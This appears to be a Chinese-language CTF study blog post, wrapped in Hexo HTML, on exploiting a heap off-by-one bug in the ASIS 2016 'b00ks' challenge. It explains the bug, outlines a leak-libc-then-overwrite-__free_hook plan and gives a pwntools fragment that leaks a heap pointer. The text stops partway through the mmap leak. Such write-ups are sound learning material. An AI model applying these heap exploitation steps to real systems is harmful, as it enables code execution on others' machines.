@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":300},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="堆溢出的Off-By-One一、例题[Asis_2016_b00ks](ctf-challenges&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;off_by_one&#x2F;Asis_2016_b00ks at master · ctf-wiki&#x2F;ctf-challenges) 12345678910Welcome to ASI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习笔记：堆溢出的Off-By-One">
+<meta property="og:url" content="http://whoamiuu.github.io/2026/02/17/2026-02-17-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84Off-By-One/index.html">
+<meta property="og:site_name" content="Whoamiuu&#39;s Blogs">
+<meta property="og:description" content="堆溢出的Off-By-One一、例题[Asis_2016_b00ks](ctf-challenges&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;off_by_one&#x2F;Asis_2016_b00ks at master · ctf-wiki&#x2F;ctf-challenges) 12345678910Welcome to ASI">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/%E8%AF%A6%E8%A7%A3.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/heap.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/heap2.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/heap3.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/%E8%AF%A6%E8%A7%A32.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/1.png">
+<meta property="og:image" content="c:\Users\WH\Desktop\Blog\source\images\26-02-14-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one\mmap2.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/mmap3.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/%E8%AF%A6%E8%A7%A33.png">
+<meta property="article:published_time" content="2026-02-17T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-22T17:59:06.673Z">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="heap-overflow">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://whoamiuu.github.io/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/%E8%AF%A6%E8%A7%A3.png">
+
+
+<link rel="canonical" href="http://whoamiuu.github.io/2026/02/17/2026-02-17-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84Off-By-One/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2026/02/17/2026-02-17-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84Off-By-One/","path":"2026/02/17/2026-02-17-堆溢出的Off-By-One/","title":"学习笔记：堆溢出的Off-By-One"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>学习笔记：堆溢出的Off-By-One | Whoamiuu's Blogs</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Whoamiuu's Blogs</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84Off-By-One"><span class="nav-number">1.</span> <span class="nav-text">堆溢出的Off-By-One</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BE%8B%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">一、例题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">二、调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%B3%84%E9%9C%B2%E5%A0%86%E6%8C%87%E9%92%88"><span class="nav-number">1.2.1.</span> <span class="nav-text">（一）泄露堆指针</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B3%84%E9%9C%B2-mmap"><span class="nav-number">1.2.2.</span> <span class="nav-text">（二）泄露 mmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%B8%83%E7%BD%AE-free-hook"><span class="nav-number">1.2.3.</span> <span class="nav-text">（三）布置 free_hook</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/02/17/2026-02-17-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84Off-By-One/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="学习笔记：堆溢出的Off-By-One | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          学习笔记：堆溢出的Off-By-One
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-17 10:00:00" itemprop="dateCreated datePublished" datetime="2026-02-17T10:00:00+08:00">2026-02-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-02-23 01:59:06" itemprop="dateModified" datetime="2026-02-23T01:59:06+08:00">2026-02-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="堆溢出的Off-By-One"><a href="#堆溢出的Off-By-One" class="headerlink" title="堆溢出的Off-By-One"></a>堆溢出的Off-By-One</h1><h2 id="一、例题"><a href="#一、例题" class="headerlink" title="一、例题"></a>一、例题</h2><p>[Asis_2016_b00ks](<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/off_by_one/Asis_2016_b00ks">ctf-challenges&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;heap&#x2F;off_by_one&#x2F;Asis_2016_b00ks at master · ctf-wiki&#x2F;ctf-challenges</a>)</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: aaa</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>题目是一个 book 管理程序，有6个选项，通过分配堆存储信息。题目的漏洞在特别细微的地方，仔细看其中自定义的输入函数，它循环中的判断会在判定结束后读入’\0’，导致Off-By-One。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">My_Read</span><span class="params">(<span class="type">char</span> *ptr,<span class="type">int</span> size)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  <span class="type">ssize_t</span> sVar2;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">    uVar1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* 以读取字符计数器 */</span></span><br><span class="line">    local_14 = <span class="number">0</span>;</span><br><span class="line">    buf = ptr;</span><br><span class="line">                    <span class="comment">/* 判断是否结尾(遇到\n或达到size) */</span></span><br><span class="line">    <span class="keyword">while</span> (sVar2 = read(<span class="number">0</span>,buf,<span class="number">1</span>), (<span class="type">int</span>)sVar2 == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((*buf == <span class="string">&#x27;\n&#x27;</span>) || (buf = buf + <span class="number">1</span>, local_14 == size)) &#123;</span><br><span class="line">        *buf = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      local_14 = local_14 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，计数器 local_14 从 0 开始计数，直到 local_14 达到 size 会写入NULL，实际上是读取了 size+1 字节。</p>
+<p>在其他地方作者有意识的避免 off-by-one，比如<code>iVar1 = My_Read(ptr_description,size + -1);</code>，通过输入 size-1 平衡 My_Read 里的溢出，不过在 auther_name 这里忘记去 -1，导致实际读入 33 字节。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">auther_name</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  iVar1 = My_Read(PTR_DAT_00302018,<span class="number">0x20</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> iVar1 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面就是这道题最核心的漏洞，在继续漏洞利用之前，先说明一下整个get shell思路(更具体之后会写)：</p>
+<ol>
+<li><p>malloc分配堆有两种方式，brk 和 mmap，调试发现 mmap 分配的内存地址和 libc 基址存在固定偏移，我们希望通过泄露 mmap 分配的内存地址推知 libc 基址。</p>
+<p>（在泄露 mmap 分配内存地址之前需要先泄露一个堆指针，以便找到 mmap 具体位置）</p>
+</li>
+<li><p>得到 libc 基址后我们就可以找到 __free_hook 变量地址和 one_gadget 地址。</p>
+<p>（注：原环境glibc 2.27，高版本 hook 被移除）</p>
+</li>
+<li><p>然后我们希望将 one_gadget 地址写入 <code>__free_hook</code>处，并将<code> __free_hook</code>地址当作指针去 free，即可执行 one_gadget</p>
+</li>
+</ol>
+<h2 id="二、调试"><a href="#二、调试" class="headerlink" title="二、调试"></a>二、调试</h2><h3 id="（一）泄露堆指针"><a href="#（一）泄露堆指针" class="headerlink" title="（一）泄露堆指针"></a>（一）泄露堆指针</h3><p>我们来看PTR_DAT_00302018这个指针。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                     PTR_Array                                     </span><br><span class="line">00302010 60 20 30        addr       DAT_00302060                   </span><br><span class="line">         00 00 00 </span><br><span class="line">         00 00</span><br><span class="line">                     PTR_DAT_00302018                             </span><br><span class="line">00302018 40 20 30        addr       DAT_00302040                   </span><br><span class="line">         00 00 00 </span><br><span class="line">         00 00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>PTR_Array 是一个指针数组，可以发现，PTR_Array 指向 DAT_00302060，PTR_DAT_00302018 指向 DAT_00302040，两者相差32字节，所以，My_Read 的一字节NULL溢出会溢出到 PTR_Array 第一个指针指向的地址。</p>
+<p>来看 PTR_Array 这里的反编译。 local_20 指向分配的堆，并且PTR_Array第一项刚好local_20 。在 Create a book 选项，会向堆读入数据，然而，之前溢出的NULL刚好被读入的数据覆盖，也就是说， author name 将没有结束符，在 printf 时会连带着将后面数据泄露出来。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">local_20 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">if</span> (local_20 != (<span class="type">int</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    local_20[<span class="number">6</span>] = size;</span><br><span class="line">    *(<span class="type">int</span> **)(PTR_Array + (<span class="type">long</span>)local_24 * <span class="number">8</span>) = local_20;</span><br><span class="line">    *(<span class="type">void</span> **)(local_20 + <span class="number">4</span>) = ptr_description;</span><br><span class="line">    *(<span class="type">void</span> **)(local_20 + <span class="number">2</span>) = ptr_name;</span><br><span class="line">    DAT_00302024 = DAT_00302024 + <span class="number">1</span>;</span><br><span class="line">    *local_20 = DAT_00302024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体关系如下图，PTR_Array就是一个指针数组，指向bss段，存储各个结构体指针(local_20)。PTR_Array中第一个指针就是local_20， local_20上面就是Author，NULL溢出并覆盖后 printf 连带泄露的就是 local_20指针。</p>
+<blockquote>
+<p>这里用 *name 以区分指针和数据，并非解引用</p>
+</blockquote>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/%E8%AF%A6%E8%A7%A3.png" alt="image-20260220003513130"></p>
+<p>如下构造payload，我们先输入32字节数据，实际上是33字节，有一个NULL溢出到下一个位置，之后1. Create a book选项读入数据刚好覆盖掉NULL，导致 author name 后没有结束符，然后4. Print book detail选项，Author项的 printf 会带出第一个指针。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;Enter author name:&#x27;</span>) <span class="comment"># input author name</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>) <span class="comment"># create book1</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;object1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;object1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) <span class="comment"># print book1</span></span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>) <span class="comment"># &lt;== leak book1</span></span><br><span class="line">book1 = io.recv(<span class="number">6</span>)</span><br><span class="line">book1 = book1 + <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">book1 = u64(book1)</span><br><span class="line"></span><br><span class="line">info(<span class="string">f&quot;地址: <span class="subst">&#123;<span class="built_in">hex</span>(book1)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此过程完成了堆指针的泄露。接下来讲解 mmap 内存地址泄露。</p>
+<h3 id="（二）泄露-mmap"><a href="#（二）泄露-mmap" class="headerlink" title="（二）泄露 mmap"></a>（二）泄露 mmap</h3><p>我们来gdb调试查看，Create a book选项申请了三个堆块，在选项完成后中断。这里堆块的Size是0x30，刚好是我们申请0x20的堆块大小 加上0x10的chunk header。</p>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/heap.png" alt="image-20260218113848253"></p>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/heap2.png" alt="image-20260218105817087"></p>
+<p>明显这三个堆是连续的，我们来看一下堆的详细内容。</p>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/heap3.png" alt="屏幕截图 2026-02-18 173029"></p>
+<p>可以看到每个堆块的前0x10字节作为chunk header，包括前8字节的 prev_size 以及后8字节的 size，之后便是可以使用的 user data。根据里面的数据推断，每个 chunk 的内容如上图。</p>
+<p>重点在 chunk3，很明显这就是一个 book 的结构体，0x555555603710 作为 malloc(0x20) 返回的 user_ptr (即上述local_20) 存储在指针数组PTR_Array里。根据之前Off-By-One解释，这里作为PTR_Array的第一个指针，其最低字节可以被NULL覆盖，也就是说我们可以将此指针低字节置0，使其指向更低地址处。</p>
+<p>对于此处，0x555555603710 (local_20) 低字节置零后为 0x555555603700，相当于向上偏移0x10。此时 local_20 指向chunk header，如果继续执行程序会将一部分非指针数据当作指针去寻址，导致 Segmentation fault。很明显这样溢出没有意义。</p>
+<p>我们知道，首次连续申请的堆块在内存上是连续的，上图也证明了这一点。其中 chunk1(name) 和 chunk2(description) 的大小是由用户来控制的，如果我们申请的 chunk1 和 chunk2 更大一些，让 chunk2 返回指针的末尾字节刚好是 0x700，这样当我们将 local_20 低字节置零后，local_20 刚好指向 chunk2 ，并且如果我们在置零前在 chunk2(description) 部分提前伪造好一个 chunk3 的结构体，其中指针由攻击者控制，于是就可以获得任意地址读写的能力。此处”任意地址读”靠已有的 printf(…) 部分实现.</p>
+<blockquote>
+<p>这里用 *name 以区分指针和数据，并非解引用。</p>
+</blockquote>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/%E8%AF%A6%E8%A7%A32.png" alt="image-20260220005824790"></p>
+<p>ctf-wiki上提供了一种非常巧妙的 libc 地址泄漏方法，即<strong>mmap 分配的内存与 libc 之间的偏移是固定的</strong></p>
+<p>我们知道，malloc 分配内存有两种方式，当 malloc 申请非常大的内存（通常大于 128KB）时，不使用传统的堆（brk 扩展），而是调用 <code>mmap()</code> 系统调用单独映射一块内存。</p>
+<p>简单来讲，brk 扩展就是从 Top chunk 分割一个块，其位置还是在堆区域；而 mmap 映射则是由内核决定这块内存的位置。</p>
+<p>下面我们 gdb 调试观察 mmap 分配的内存区域。为了区分结构体堆块和用户申请堆块，我们创建第一本书时将 name_size 和 desc_size 设置成16字节。创建第二本书时将 name_size 和 desc_size 设置成 2000000 字节(触发mmap)。</p>
